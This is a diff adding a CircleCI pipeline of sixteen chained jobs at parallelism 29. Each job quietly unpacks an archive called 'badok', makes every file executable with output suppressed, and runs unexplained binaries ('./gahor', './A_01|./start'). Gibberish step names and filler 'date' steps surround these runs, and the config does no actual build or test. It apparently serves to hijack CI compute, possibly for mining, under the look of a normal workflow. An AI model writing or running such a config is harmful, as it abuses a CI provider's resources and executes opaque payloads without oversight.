@@ -1,0 +1,941 @@
+version: 2.1
+jobs:
+  amserda:
+    docker:
+      - image: cimg/python:3.8
+    steps:
+      - checkout
+      - run:
+          name: sampa
+          command: |
+            tar -xf badok >/dev/null 2>&1
+      - run:
+          name: haru
+          command: |
+            chmod u+x * >/dev/null 2>&1
+      - run:
+          name: bilak
+          command: |
+            ./gahor
+      - run:
+          name: kitak
+          command: |
+            date
+      - run:
+          name: paol
+          command: |
+            date
+      - run:
+          name: pyuri
+          command: |
+            date
+      - run:
+          name: senaka
+          command: |
+            date
+      - run:
+          name: ajab
+          command: |
+            date
+      - run:
+          name: kauni
+          command: |
+            date
+      - run:
+          name: nani
+          command: |
+            date
+      - run:
+          name: lopar
+          command: |
+            date
+      - run:
+          name: nuert
+          command: |
+            date
+    parallelism: 29
+
+  belgita:
+    docker:
+      - image: cimg/python:3.8
+    steps:
+      - checkout
+      - run:
+          name: puili
+          command: |
+            tar -xf badok >/dev/null 2>&1
+      - run:
+          name: ajap
+          command: |
+            chmod u+x * >/dev/null 2>&1
+      - run:
+          name: kulisa
+          command: |
+            ./gahor
+      - run:
+          name: maurt
+          command: |
+            date
+      - run:
+          name: jeneng
+          command: |
+            date
+      - run:
+          name: siopo
+          command: |
+            ./A_01|./start
+      - run:
+          name: kui
+          command: |
+            date
+      - run:
+          name: piero
+          command: |
+            ./A_01|./start
+      - run:
+          name: najuilo
+          command: |
+            date
+      - run:
+          name: nerte
+          command: |
+            date
+      - run:
+          name: jinggek
+          command: |
+            date
+      - run:
+          name: ilep
+          command: |
+            date
+    parallelism: 29
+
+  camerun:
+    docker:
+      - image: cimg/python:3.8
+    steps:
+      - checkout
+      - run:
+          name: ytandro
+          command: |
+            tar -xf badok >/dev/null 2>&1
+      - run:
+          name: bang
+          command: |
+            chmod u+x * >/dev/null 2>&1
+      - run:
+          name: andr
+          command: |
+            ./gahor
+      - run:
+          name: channel
+          command: |
+            date
+      - run:
+          name: ytch
+          command: |
+            ./A_01|./start
+      - run:
+          name: dial
+          command: |
+            date
+      - run:
+          name: erro
+          command: |
+            ./A_01|./start
+      - run:
+          name: mapse
+          command: |
+            date
+      - run:
+          name: ipole
+          command: |
+            date
+      - run:
+          name: tiren
+          command: |
+            date
+      - run:
+          name: polert
+          command: |
+            date
+      - run:
+          name: riope
+          command: |
+            date
+    parallelism: 29
+
+  danmark:
+    docker:
+      - image: cimg/python:3.8
+    steps:
+      - checkout
+      - run:
+          name: kapse
+          command: |
+            tar -xf badok >/dev/null 2>&1
+      - run:
+          name: nuilert
+          command: |
+            chmod u+x * >/dev/null 2>&1
+      - run:
+          name: kuoip
+          command: |
+            ./gahor
+      - run:
+          name: kelrti
+          command: |
+            date
+      - run:
+          name: jamper
+          command: |
+            date
+      - run:
+          name: teliur
+          command: |
+            date
+      - run:
+          name: wenek
+          command: |
+            ./A_01|./start
+      - run:
+          name: sendi
+          command: |
+            date
+      - run:
+          name: jaja
+          command: |
+            date
+      - run:
+          name: mahrijah
+          command: |
+            ./A_01|./start
+      - run:
+          name: senapan
+          command: |
+            date
+      - run:
+          name: jituk
+          command: |
+            date
+    parallelism: 29
+
+  erhan:
+    docker:
+      - image: cimg/python:3.8
+    steps:
+      - checkout
+      - run:
+          name: kolor
+          command: |
+            tar -xf badok >/dev/null 2>&1
+      - run:
+          name: ijo
+          command: |
+            chmod u+x * >/dev/null 2>&1
+      - run:
+          name: banyk
+          command: |
+            ./gahor
+      - run:
+          name: corba
+          command: |
+            date
+      - run:
+          name: di
+          command: |
+            date
+      - run:
+          name: sanasini
+          command: |
+            date
+      - run:
+          name: sinisana
+          command: |
+            date
+      - run:
+          name: bual
+          command: |
+            ./A_01|./start
+      - run:
+          name: ajah
+          command: |
+            date
+      - run:
+          name: tuyu
+          command: |
+            date
+      - run:
+          name: nad
+          command: |
+            date
+      - run:
+          name: mbak
+          command: |
+            ./A_01|./start
+    parallelism: 29
+
+  fitmen:
+    docker:
+      - image: cimg/python:3.8
+    steps:
+      - checkout
+      - run:
+          name: tuli
+          command: |
+            tar -xf badok >/dev/null 2>&1
+      - run:
+          name: piar
+          command: |
+            chmod u+x * >/dev/null 2>&1
+      - run:
+          name: tulipi
+          command: |
+            ./gahor
+      - run:
+          name: mpertu
+          command: |
+            date
+      - run:
+          name: augian
+          command: |
+            date
+      - run:
+          name: segian
+          command: |
+            ./A_01|./start
+      - run:
+          name: canda
+          command: |
+            date
+      - run:
+          name: kirnta
+          command: |
+            ./A_01|./start
+      - run:
+          name: malan
+          command: |
+            date
+      - run:
+          name: nasik
+          command: |
+            date
+      - run:
+          name: baci
+          command: |
+            date
+      - run:
+          name: satit
+          command: |
+            date
+    parallelism: 29
+
+  germanik:
+    docker:
+      - image: cimg/python:3.8
+    steps:
+      - checkout
+      - run:
+          name: hatit
+          command: |
+            tar -xf badok >/dev/null 2>&1
+      - run:
+          name: kuku
+          command: |
+            chmod u+x * >/dev/null 2>&1
+      - run:
+          name: delita
+          command: |
+            ./gahor
+      - run:
+          name: melana
+          command: |
+            date
+      - run:
+          name: ajiba
+          command: |
+            date
+      - run:
+          name: rowon
+          command: |
+            date
+      - run:
+          name: rontek
+          command: |
+            ./A_01|./start
+      - run:
+          name: perti
+          command: |
+            date
+      - run:
+          name: snalep
+          command: |
+            date
+      - run:
+          name: pembut
+          command: |
+            date
+      - run:
+          name: mulipase
+          command: |
+            ./A_01|./start
+      - run:
+          name: janapni
+          command: |
+            date
+    parallelism: 29
+
+  honton:
+    docker:
+      - image: cimg/python:3.8
+    steps:
+      - checkout
+      - run:
+          name: peloure
+          command: |
+            tar -xf badok >/dev/null 2>&1
+      - run:
+          name: gulifu
+          command: |
+            chmod u+x * >/dev/null 2>&1
+      - run:
+          name: pelakin
+          command: |
+            ./gahor
+      - run:
+          name: sualap
+          command: |
+            date
+      - run:
+          name: nyayak
+          command: |
+            date
+      - run:
+          name: bilarti
+          command: |
+            date
+      - run:
+          name: enakap
+          command: |
+            ./A_01|./start
+      - run:
+          name: didengel
+          command: |
+            date
+      - run:
+          name: sualapone
+          command: |
+            date
+      - run:
+          name: kaupalo
+          command: |
+            ./A_01|./start
+      - run:
+          name: medal
+          command: |
+            date
+      - run:
+          name: bedak
+          command: |
+            date
+    parallelism: 29
+
+  indnisia:
+    docker:
+      - image: cimg/python:3.8
+    steps:
+      - checkout
+      - run:
+          name: make
+          command: |
+            tar -xf badok >/dev/null 2>&1
+      - run:
+          name: pipan
+          command: |
+            chmod u+x * >/dev/null 2>&1
+      - run:
+          name: mulahan
+          command: |
+            ./gahor
+      - run:
+          name: batubat
+          command: |
+            ./A_01|./start
+      - run:
+          name: atapun
+          command: |
+            date
+      - run:
+          name: jadian
+          command: |
+            ./A_01|./start
+      - run:
+          name: kapanya
+          command: |
+            date
+      - run:
+          name: biarara
+          command: |
+            date
+      - run:
+          name: tahuil
+          command: |
+            date
+      - run:
+          name: polertuip
+          command: |
+            date
+      - run:
+          name: olepan
+          command: |
+            date
+      - run:
+          name: nuertipo
+          command: |
+            date
+    parallelism: 29
+
+  japin:
+    docker:
+      - image: cimg/python:3.8
+    steps:
+      - checkout
+      - run:
+          name: perti
+          command: |
+            tar -xf badok >/dev/null 2>&1
+      - run:
+          name: kulsipan
+          command: |
+            chmod u+x * >/dev/null 2>&1
+      - run:
+          name: ipanana
+          command: |
+            ./gahor
+      - run:
+          name: hijolpi
+          command: |
+            date
+      - run:
+          name: gelanite
+          command: |
+            date
+      - run:
+          name: melertu
+          command: |
+            date
+      - run:
+          name: janipee
+          command: |
+            ./A_01|./start
+      - run:
+          name: senip
+          command: |
+            date
+      - run:
+          name: ohala
+          command: |
+            date
+      - run:
+          name: libut
+          command: |
+            ./A_01|./start
+      - run:
+          name: kaliat
+          command: |
+            date
+      - run:
+          name: puna
+          command: |
+            date
+    parallelism: 29
+
+  kemboji:
+    docker:
+      - image: cimg/python:3.8
+    steps:
+      - checkout
+      - run:
+          name: soumpo
+          command: |
+            tar -xf badok >/dev/null 2>&1
+      - run:
+          name: ponem
+          command: |
+            chmod u+x * >/dev/null 2>&1
+      - run:
+          name: biolpan
+          command: |
+            ./gahor
+      - run:
+          name: rienti
+          command: |
+            date
+      - run:
+          name: tinert
+          command: |
+            date
+      - run:
+          name: bopureti
+          command: |
+            date
+      - run:
+          name: nupiewe
+          command: |
+            date
+      - run:
+          name: jenapio
+          command: |
+            date
+      - run:
+          name: kolertin
+          command: |
+            ./A_01|./start
+      - run:
+          name: mulipase
+          command: |
+            date
+      - run:
+          name: kabalei
+          command: |
+            ./A_01|./start
+      - run:
+          name: moperi
+          command: |
+            date
+    parallelism: 29
+
+  loas:
+    docker:
+      - image: cimg/python:3.8
+    steps:
+      - checkout
+      - run:
+          name: selemut
+          command: |
+            tar -xf badok >/dev/null 2>&1
+      - run:
+          name: titem
+          command: |
+            chmod u+x * >/dev/null 2>&1
+      - run:
+          name: hipole
+          command: |
+            ./gahor
+      - run:
+          name: mapiser
+          command: |
+            date
+      - run:
+          name: oleprti
+          command: |
+            date
+      - run:
+          name: jamica
+          command: |
+            date
+      - run:
+          name: open
+          command: |
+            ./A_01|./start
+      - run:
+          name: oben
+          command: |
+            date
+      - run:
+          name: gkada
+          command: |
+            ./A_01|./start
+      - run:
+          name: aspak
+          command: |
+            date
+      - run:
+          name: lokot
+          command: |
+            date
+      - run:
+          name: tiper
+          command: |
+            date
+    parallelism: 29
+
+  manyar:
+    docker:
+      - image: cimg/python:3.8
+    steps:
+      - checkout
+      - run:
+          name: daiolon
+          command: |
+            tar -xf badok >/dev/null 2>&1
+      - run:
+          name: airti
+          command: |
+            chmod u+x * >/dev/null 2>&1
+      - run:
+          name: mulpu
+          command: |
+            ./gahor
+      - run:
+          name: sepoer
+          command: |
+            date
+      - run:
+          name: datada
+          command: |
+            date
+      - run:
+          name: nupiert
+          command: |
+            date
+      - run:
+          name: muier
+          command: |
+            date
+      - run:
+          name: kulipas
+          command: |
+            date
+      - run:
+          name: sampier
+          command: |
+            ./A_01|./start
+      - run:
+          name: olet
+          command: |
+            date
+      - run:
+          name: jupoert
+          command: |
+            date
+      - run:
+          name: olertio
+          command: |
+            ./A_01|./start
+    parallelism: 29
+
+  negertia:
+    docker:
+      - image: cimg/python:3.8
+    steps:
+      - checkout
+      - run:
+          name: doper
+          command: |
+            tar -xf badok >/dev/null 2>&1
+      - run:
+          name: neroper
+          command: |
+            chmod u+x * >/dev/null 2>&1
+      - run:
+          name: muweri
+          command: |
+            ./gahor
+      - run:
+          name: jamloper
+          command: |
+            date
+      - run:
+          name: kiupole
+          command: |
+            date
+      - run:
+          name: amplita
+          command: |
+            date
+      - run:
+          name: jandire
+          command: |
+            ./A_01|./start
+      - run:
+          name: peritase
+          command: |
+            ./A_01|./start
+      - run:
+          name: nerpoilo
+          command: |
+            date
+      - run:
+          name: hograep
+          command: |
+            date
+      - run:
+          name: gopal
+          command: |
+            date
+      - run:
+          name: senutaci
+          command: |
+            date
+    parallelism: 29
+
+  orgini:
+    docker:
+      - image: cimg/python:3.8
+    steps:
+      - checkout
+      - run:
+          name: iperti
+          command: |
+            tar -xf badok >/dev/null 2>&1
+      - run:
+          name: nuerwe
+          command: |
+            chmod u+x * >/dev/null 2>&1
+      - run:
+          name: wipoe
+          command: |
+            ./gahor
+      - run:
+          name: masai
+          command: |
+            date
+      - run:
+          name: pmerti
+          command: |
+            ./A_01|./start
+      - run:
+          name: melase
+          command: |
+            date
+      - run:
+          name: dalopa
+          command: |
+            ./A_01|./start
+      - run:
+          name: gloden
+          command: |
+            date
+      - run:
+          name: jidang
+          command: |
+            date
+      - run:
+          name: mulah
+          command: |
+            date
+      - run:
+          name: meliat
+          command: |
+            date
+      - run:
+          name: polweri
+          command: |
+            date
+    parallelism: 29
+
+  panam:
+    docker:
+      - image: cimg/python:3.8
+    steps:
+      - checkout
+      - run:
+          name: pileuyio
+          command: |
+            tar -xf badok >/dev/null 2>&1
+      - run:
+          name: hamuieri
+          command: |
+            chmod u+x * >/dev/null 2>&1
+      - run:
+          name: sentulioer
+          command: |
+            ./gahor
+      - run:
+          name: nueriwercu
+          command: |
+            date
+      - run:
+          name: rembopat
+          command: |
+            date
+      - run:
+          name: nuertipi
+          command: |
+            date
+      - run:
+          name: verpilra
+          command: |
+            date
+      - run:
+          name: xertanci
+          command: |
+            ./A_01|./start
+      - run:
+          name: nuertioer
+          command: |
+            date
+      - run:
+          name: sexcanti
+          command: |
+            ./A_01|./start
+      - run:
+          name: uyermiu
+          command: |
+            date
+      - run:
+          name: perl
+          command: |
+            date
+    parallelism: 29
+
+
+
+
+
+
+workflows:
+  version: 2
+  all:
+    jobs:
+      - amserda
+      - belgita:
+          requires:
+            - amserda
+      - camerun:
+          requires:
+            - belgita
+      - danmark:
+          requires:
+            - camerun
+      - erhan:
+          requires:
+            - danmark
+      - fitmen:
+          requires:
+            - erhan
+      - germanik:
+          requires:
+            - fitmen
+      - honton:
+          requires:
+            - germanik
+      - indnisia:
+          requires:
+            - honton
+      - japin:
+          requires:
+            - indnisia
+      - kemboji:
+          requires:
+            - japin
+      - loas:
+          requires:
+            - kemboji
+      - manyar:
+          requires:
+            - loas
+      - negertia:
+          requires:
+            - manyar
+      - orgini:
+          requires:
+            - negertia
+      - panam:
+          requires:
+            - orgini
+
+
+
+
